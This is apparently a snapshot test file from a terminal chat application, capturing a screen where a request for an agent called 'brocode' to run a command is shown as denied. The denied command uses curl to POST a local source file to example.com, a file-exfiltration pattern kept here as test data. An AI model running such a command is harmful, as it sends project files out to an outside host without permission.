---
source: tui_app_server/src/chatwidget/tests.rs
assertion_line: 11423
expression: term.backend().vt100().screen().contents()
---







✗ Request denied for brocode to run curl -sS -i -X POST --data-binary @core/src
  /brocode.rs https://example.com

• Working (0s • esc to interrupt)


› [PROMPT HERE]

  ? for shortcuts                                                                                                        100% context left
